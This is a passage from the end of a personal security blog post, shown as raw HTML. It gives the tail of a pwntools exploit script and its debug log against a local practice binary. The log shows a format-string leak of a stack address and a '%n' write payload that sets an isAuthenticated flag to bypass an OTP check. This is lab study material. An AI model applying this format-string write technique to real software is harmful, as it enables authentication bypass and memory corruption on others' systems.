</span></span><span style=display:flex><span>    <span style=color:#75715e># -------------------------</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># Stage 5: Read result</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># -------------------------</span>
</span></span><span style=display:flex><span>    out <span style=color:#f92672>=</span> p<span style=color:#f92672>.</span>recvall(timeout<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;[*] Program output:&#34;</span>)
</span></span><span style=display:flex><span>    print(out<span style=color:#f92672>.</span>decode(errors<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;ignore&#34;</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;Access Granted&#34;</span> <span style=color:#f92672>in</span> out:
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#34;[+] SUCCESS&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#34;[-] FAILURE&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>close()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
</span></span><span style=display:flex><span>    main()
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> <span style=color:#e6db74>&#39;/home/sanketh/assembly/vuln/buffer_overflow/stack_based_buffer_overflow/format_strings/vuln&#39;</span>
</span></span><span style=display:flex><span>    Arch:       amd64-64-little
</span></span><span style=display:flex><span>    RELRO:      Full RELRO
</span></span><span style=display:flex><span>    Stack:      Canary found
</span></span><span style=display:flex><span>    NX:         NX enabled
</span></span><span style=display:flex><span>    PIE:        PIE enabled
</span></span><span style=display:flex><span>    SHSTK:      Enabled
</span></span><span style=display:flex><span>    IBT:        Enabled
</span></span><span style=display:flex><span>    Stripped:   No
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Launching process
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Starting local process <span style=color:#e6db74>&#39;./vuln&#39;</span> argv<span style=color:#f92672>=[</span>b<span style=color:#e6db74>&#39;./vuln&#39;</span><span style=color:#f92672>]</span> : pid <span style=color:#ae81ff>9369</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Waiting <span style=color:#66d9ef>for</span> Username prompt
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>DEBUG<span style=color:#f92672>]</span> Received 0x10 bytes:
</span></span><span style=display:flex><span>    b<span style=color:#e6db74>&#39;Enter Username: &#39;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Sending format string leak
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>DEBUG<span style=color:#f92672>]</span> Sent 0x6 bytes:
</span></span><span style=display:flex><span>    b<span style=color:#e6db74>&#39;%10$p\n&#39;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Reading leak output
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>DEBUG<span style=color:#f92672>]</span> Received 0x1d bytes:
</span></span><span style=display:flex><span>    b<span style=color:#e6db74>&#39;Enter otp for: 0x7ffc5e8deac0&#39;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>DEBUG<span style=color:#f92672>]</span> Full leak buffer:
</span></span><span style=display:flex><span>b<span style=color:#e6db74>&#39;Enter otp for: 0x7ffc5e8deac0&#39;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Leaked main RBP: 0x7ffc5e8deac0
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> isAuthenticated @ 0x7ffc5e8dea94
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>DEBUG<span style=color:#f92672>]</span> Payload bytes: b<span style=color:#e6db74>&#39;h%9$nXXX\x94\xea\x8d^\xfc\x7f\x00\x00\n&#39;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Sending OTP payload
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>DEBUG<span style=color:#f92672>]</span> Sent 0x11 bytes:
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>00000000</span>  <span style=color:#ae81ff>68</span> <span style=color:#ae81ff>25</span> <span style=color:#ae81ff>39</span> <span style=color:#ae81ff>24</span>  6e <span style=color:#ae81ff>58</span> <span style=color:#ae81ff>58</span> <span style=color:#ae81ff>58</span>  <span style=color:#ae81ff>94</span> ea 8d 5e  fc 7f <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  │h%9$│nXXX│···^│····│
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>00000010</span>  0a                                                  │·│
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>00000011</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Receiving all data: Done <span style=color:#f92672>(</span>86B<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>DEBUG<span style=color:#f92672>]</span> Received 0x56 bytes:
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>00000000</span>  <span style=color:#ae81ff>59</span> 6f <span style=color:#ae81ff>75</span> <span style=color:#ae81ff>20</span>  <span style=color:#ae81ff>65</span> 6e <span style=color:#ae81ff>74</span> <span style=color:#ae81ff>65</span>  <span style=color:#ae81ff>72</span> <span style=color:#ae81ff>65</span> <span style=color:#ae81ff>64</span> <span style=color:#ae81ff>20</span>  6f <span style=color:#ae81ff>74</span> <span style=color:#ae81ff>70</span> 3a  │You │ente│red │otp:│
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>00000010</span>  <span style=color:#ae81ff>20</span> <span style=color:#ae81ff>68</span> <span style=color:#ae81ff>58</span> <span style=color:#ae81ff>58</span>  <span style=color:#ae81ff>58</span> <span style=color:#ae81ff>94</span> ea 8d  5e fc 7f <span style=color:#ae81ff>41</span>  <span style=color:#ae81ff>63</span> <span style=color:#ae81ff>63</span> <span style=color:#ae81ff>65</span> <span style=color:#ae81ff>73</span>  │ hXX│X···│^··A│cces│
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>00000020</span>  <span style=color:#ae81ff>73</span> <span style=color:#ae81ff>20</span> <span style=color:#ae81ff>47</span> <span style=color:#ae81ff>72</span>  <span style=color:#ae81ff>61</span> 6e <span style=color:#ae81ff>74</span> <span style=color:#ae81ff>65</span>  <span style=color:#ae81ff>64</span> 0a 2a 2a  2a <span style=color:#ae81ff>20</span> <span style=color:#ae81ff>73</span> <span style=color:#ae81ff>74</span>  │s Gr│ante│d·**│* st│
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>00000030</span>  <span style=color:#ae81ff>61</span> <span style=color:#ae81ff>63</span> 6b <span style=color:#ae81ff>20</span>  <span style=color:#ae81ff>73</span> 6d <span style=color:#ae81ff>61</span> <span style=color:#ae81ff>73</span>  <span style=color:#ae81ff>68</span> <span style=color:#ae81ff>69</span> 6e <span style=color:#ae81ff>67</span>  <span style=color:#ae81ff>20</span> <span style=color:#ae81ff>64</span> <span style=color:#ae81ff>65</span> <span style=color:#ae81ff>74</span>  │ack │smas│hing│ det│
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>00000040</span>  <span style=color:#ae81ff>65</span> <span style=color:#ae81ff>63</span> <span style=color:#ae81ff>74</span> <span style=color:#ae81ff>65</span>  <span style=color:#ae81ff>64</span> <span style=color:#ae81ff>20</span> 2a 2a  2a 3a <span style=color:#ae81ff>20</span> <span style=color:#ae81ff>74</span>  <span style=color:#ae81ff>65</span> <span style=color:#ae81ff>72</span> 6d <span style=color:#ae81ff>69</span>  │ecte│d **│*: t│ermi│
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>00000050</span>  6e <span style=color:#ae81ff>61</span> <span style=color:#ae81ff>74</span> <span style=color:#ae81ff>65</span>  <span style=color:#ae81ff>64</span> 0a                                  │nate│d·│
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>00000056</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Stopped process <span style=color:#e6db74>&#39;./vuln&#39;</span> <span style=color:#f92672>(</span>pid 9369<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Program output:
</span></span><span style=display:flex><span>You entered otp: hXXX^<span style=color:#ae81ff>\x</span>7fAccess Granted
</span></span><span style=display:flex><span>*** stack smashing detected ***: terminated
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> SUCCESS
</span></span></code></pre></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://sankethbk.github.io/blog/tags/vulnerabilities/>Vulnerabilities</a></li><li><a href=https://sankethbk.github.io/blog/tags/format-string/>Format String</a></li><li><a href=https://sankethbk.github.io/blog/tags/buffer-overflow/>Buffer Overflow</a></li><li><a href=https://sankethbk.github.io/blog/tags/reverse-engineering/>Reverse Engineering</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2026 <a href=https://sankethbk.github.io/blog/>Sanketh's Blog</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>